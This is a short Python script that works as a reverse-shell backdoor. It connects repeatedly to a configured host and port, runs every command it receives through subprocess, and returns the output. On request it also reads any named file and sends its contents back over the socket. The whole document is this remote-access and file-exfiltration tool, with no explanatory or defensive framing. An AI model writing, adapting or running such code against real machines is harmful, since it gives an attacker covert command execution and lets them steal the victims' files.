import socket
import subprocess
import os

def connect():
    global s
    global host 
    global port
    # create the socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = "127.0.0.1"
    port = 80
    connected = False
    while not connected:
        try:
            s.connect((host, port))
            connected = True
        except Exception as e:
            pass

def listen():
    while True:
        data = s.recv(4096).decode("utf-8")
        if str(data) == 'download':
            upload()
            continue
        if str(data) == 'upload':
            upload()
            continue
        if str(data) == 'q':
            break
        cmd = subprocess.run(data, capture_output=True)
        s.send(cmd.stdout)
        s.send("--complete--".encode("utf-8"))

# upload
def upload():
    filename = s.recv(4096).decode("utf-8")
    f = open(filename, 'rb')
    i = f.read(4096)
    while (i):
        s.send(i)
        i = f.read(4096)
    f.close()
    s.send('--complete--'.encode("utf-8"))

def close():
    s.close()

def main():
    connect()
    listen()
    close()

main()